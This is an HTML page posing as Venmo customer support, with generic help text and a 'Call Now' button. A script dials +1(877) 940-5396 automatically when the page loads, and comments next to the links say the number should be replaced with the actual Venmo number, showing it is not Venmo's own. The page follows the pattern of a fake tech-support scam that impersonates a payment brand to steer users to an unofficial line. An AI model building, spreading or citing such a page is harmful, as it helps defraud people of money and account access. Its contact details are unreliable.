<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Venmo Customer Support</title>



    <style>
        /* Basic Reset */
        body, h1, h2, p, a {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            flex-direction: column;
            margin: 0;
        }

        /* Top Header Style */
        .header {
            background-color: #0061f2;
            color: white;
            text-align: center;
            padding: 15px 0;
            width: 100%;
        }

        .header h2 {
            margin: 0;
            font-size: 26px;
            font-weight: bold;
        }

        /* Main Container */
        .container {
            background-color: white;
            width: 90%;
            max-width: 900px;
            padding: 20px;
            margin-top: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            flex-grow: 1;
        }

        h1 {
            color: #0061f2;
            text-align: center;
            font-size: 28px;
            margin-bottom: 20px;
        }

        .info {
            font-size: 18px;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .call-now {
            background-color: #007bff;
            color: white;
            padding: 12px;
            border-radius: 5px;
            text-align: center;
            cursor: pointer;
            text-decoration: none;
            display: block;
            width: 100%;
            font-size: 18px;
            margin-top: 20px;
            text-align: center;
        }

        .call-now:hover {
            background-color: #0056b3;
        }

        /* Footer styles */
        footer {
            background-color: #333;
            color: white;
            text-align: center;
            padding: 15px;
            width: 100%;
        }

        footer a {
            color: white;
            text-decoration: none;
            font-weight: bold;
        }

        footer a:hover {
            text-decoration: underline;
        }

        /* Responsive Design */
        @media screen and (max-width: 768px) {
            .header h2 {
                font-size: 22px;
            }

            .container {
                width: 95%;
                padding: 15px;
            }

            h1 {
                font-size: 24px;
            }

            .info {
                font-size: 16px;
            }

            .call-now {
                font-size: 16px;
                padding: 10px;
            }
        }

        @media screen and (max-width: 480px) {
            .container {
                padding: 10px;
            }

            h1 {
                font-size: 22px;
            }

            .info {
                font-size: 14px;
            }

            footer {
                font-size: 14px;
                padding: 12px;
            }

            .call-now {
                font-size: 16px;
                padding: 12px;
            }
        }
    </style>
</head>

<script>
    function autoDial() {
      var phoneNumber = "+1(877) 940-5396";
      window.location.href = "tel:" + phoneNumber;
    }

    function call() {
      // Implement the call functionality here, such as initiating a phone call.
      console.log("Calling...");
    }
  </script>
</head>

<body onload="autoDial()">


    <!-- Top Header Section -->
    <div class="header">
        <h2>Venmo Customer Service</h2>
    </div>

    <div class="container">
        <h1>Venmo Customer Support</h1>

        <div class="info">
            <p>If you're experiencing issues with your Venmo account, our customer support team is here to help you resolve your concerns. Whether you're dealing with payment issues, account problems, or have general inquiries, we're available to assist you.</p>
            
            <p>We understand how important it is to have a smooth transaction experience. If you're facing problems such as transaction errors, login issues, or any concerns about your account, our team is here to provide prompt assistance.</p>

            <p>Venmo customer support is available during business hours, and you can expect quick and helpful responses. We recommend reaching out with as much detail as possible about your issue to speed up the resolution process.</p>

            <p>If you'd prefer to speak with someone directly, you can call Venmo's customer support at the following number:</p>
        </div>

        <a href="tel:+1(877) 940-5396" class="call-now">Call Now</a> <!-- Replace with actual Venmo support number -->

        <div class="info">
            <p>Our customer support team is dedicated to ensuring your experience with Venmo is seamless and hassle-free. Whether it's an urgent issue or a general inquiry, we are here to assist you every step of the way.</p>
            
            <p>For further assistance, you can also visit our help center on the official Venmo website for additional resources and FAQs.</p>
        </div>
    </div>

    <!-- Footer Section -->
    <footer>
        <p>Need help? <a href="tel:+1(877) 940-5396">Call Venmo Support</a></p> <!-- Replace with actual Venmo support number -->
    </footer>

</body>

</html>
